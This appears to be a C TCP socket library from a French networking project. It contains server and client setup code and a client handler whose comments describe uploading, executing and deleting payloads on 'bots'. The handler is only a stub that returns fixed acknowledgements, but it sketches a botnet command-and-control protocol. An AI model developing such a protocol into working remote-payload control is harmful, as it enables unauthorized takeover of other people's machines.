#include "libtcp.h"

/* ------------------------------  Serveur -----------------------------------*/
// Initialisation du Serveur:
int initialisationServeur(char *service,int connexions){
    struct addrinfo precisions,*resultat,*origine;
    int statut;
    int s;

    /* Construction de la structure adresse */
    memset(&precisions,0,sizeof precisions);
    precisions.ai_family=AF_UNSPEC;
    precisions.ai_socktype=SOCK_STREAM;
    precisions.ai_flags=AI_PASSIVE;
    statut=getaddrinfo(NULL,service,&precisions,&origine);
    if(statut<0){
        perror("initialisationServeur.getaddrinfo");
        exit(EXIT_FAILURE);
    }
    struct addrinfo *p;
    for(p=origine,resultat=origine;p!=NULL;p=p->ai_next)
    if(p->ai_family==AF_INET6){
        resultat=p;
        break;
    }

    /* Création d'une socket */
    s=socket(resultat->ai_family,resultat->ai_socktype,resultat->ai_protocol);
    if(s<0){
        perror("initialisationServeur.socket");
        exit(EXIT_FAILURE);
    }

    /* Options utiles */
    int vrai=1;
    if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&vrai,sizeof(vrai))<0){
        perror("initialisationServeur.setsockopt (REUSEADDR)");
        exit(EXIT_FAILURE);
    }
    if(setsockopt(s,IPPROTO_TCP,TCP_NODELAY,&vrai,sizeof(vrai))<0){
        perror("initialisationServeur.setsockopt (NODELAY)");
        exit(EXIT_FAILURE);
    }

    /* Specification de l'adresse de la socket */
    statut=bind(s,resultat->ai_addr,resultat->ai_addrlen);
    if(statut<0)
        return -1;

    /* Liberation de la structure d'informations */
    freeaddrinfo(origine);

    /* Taille de la queue d'attente */
    statut=listen(s,connexions);
    if(statut<0)
        return -1;

    return s;
}

// Gestion des clients :
int boucleServeur(int ecoute,int (*traitement)(int)){
    int dialogue;
    while(1){
        /* Attente d'une connexion */
        if((dialogue=accept(ecoute,NULL,NULL))<0) return -1; // accept: permet de recuprer le descripteur de fichier,

        /* Passage de la socket de dialogue a la fonction de traitement */
        if(traitement(dialogue)<0){ shutdown(ecoute,SHUT_RDWR); return 0;}

    }
}

// Fonction principale de gestion de client :
int gestionClient(int s){
    charge_t * p_struct = malloc(sizeof(charge_t));

    p_struct->name = NULL;
    p_struct->data = NULL;

    /* Obtient une structure de fichier */
    FILE *dialogue=fdopen(s,"a+"); // ouvre et lit dans le descripteur de fichier
    if(dialogue==NULL){ perror("gestionClient.fdopen"); exit(EXIT_FAILURE); }

    /* Echo */
    char ligne[MAX_LIGNE];
    int cpt=0;
    while(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){ // copie le contenu de dialogue dans ligne

        //STAT AND QUIT
        if(strncmp(ligne,"QUIT",4)==0){
            printf("j'ai recu quit\n");
            break;
        }
        else if(strncmp(ligne,"STAT",4)==0){
            fprintf(dialogue,"> %s","j'ai recu stat");
        }

        // Installation de la charge utile sur un bot
        else if(strncmp(ligne,"upload?\n",7)==0){
            fprintf(dialogue,"%s","OKupload\n");
            fflush(dialogue);
        }

        else if((atoi(ligne)!=0) && (cpt == 0)){
            fprintf(dialogue,"%s","Okname_size\n");
            fflush(dialogue);
            cpt++;
        }

        else if(strncmp(ligne,"charge_name\n",11)==0){
            fprintf(dialogue,"%s","OKname\n");
            fflush(dialogue);
        }

        else if((atoi(ligne)!=0) && (cpt == 1)){
            fprintf(dialogue,"%s","Okdata_size\n");
            fflush(dialogue);
        }

        else if(strncmp(ligne,"charge_data\n",11)==0){
            fprintf(dialogue,"%s","bye\n");
            fflush(dialogue);
        }

        else if(strncmp(ligne,"bye\n",3)==0){
            fprintf(dialogue,"%s","bye\n");
            fflush(dialogue);
        }

        // Execution d'une charge sur un bot
        else if(strncmp(ligne,"execute?\n",8)==0){
            fprintf(dialogue,"%s","OKexecute\n");
            fflush(dialogue);
        }

        else if(strncmp(ligne,"Okid\n",4)==0){
            fprintf(dialogue,"%s","bye\n");
            fflush(dialogue);
        }

        //Suppression d'une charge sur un bot
        else if(strncmp(ligne,"delet?\n",6)==0){
            fprintf(dialogue,"%s","OKdelet\n");
            fflush(dialogue);
        }

        else{
            fprintf(dialogue,"> %s",ligne);
        }
    }

    /* Termine la connexion */
    fclose(dialogue);
    return 0;
}

/*----------------------------------  Client -------------------------------------------*/
// connexion du client
int connexionServeur(char *hote,char *service){
    struct addrinfo precisions,*resultat,*origine;
    int statut;
    int s;

    /* Création de l'adresse de socket */
    memset(&precisions,0,sizeof precisions);
    precisions.ai_family=AF_UNSPEC;
    precisions.ai_socktype=SOCK_STREAM;
    statut=getaddrinfo(hote,service,&precisions,&origine);
    if(statut<0){ perror("connexionServeur.getaddrinfo"); exit(EXIT_FAILURE); }
    struct addrinfo *p;
    for(p=origine,resultat=origine;p!=NULL;p=p->ai_next)
      if(p->ai_family==AF_INET6){ resultat=p; break; }

    /* Création d'une socket */
    s=socket(resultat->ai_family,resultat->ai_socktype,resultat->ai_protocol);
    if(s<0){ perror("connexionServeur.socket"); exit(EXIT_FAILURE); }

    /* Options utiles */
    int vrai=1;
    if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&vrai,sizeof(vrai))<0){
        perror("initialisationServeur.setsockopt (REUSEADDR)");
        exit(EXIT_FAILURE);
    }
    if(setsockopt(s,IPPROTO_TCP,TCP_NODELAY,&vrai,sizeof(vrai))<0){
        perror("initialisationServeur.setsockopt (NODELAY)");
        exit(EXIT_FAILURE);
    }


    /* Connection de la socket a l'hote */
    if(connect(s,resultat->ai_addr,resultat->ai_addrlen)<0) return -1;

    /* Liberation de la structure d'informations */
    freeaddrinfo(origine);

    return s;
}
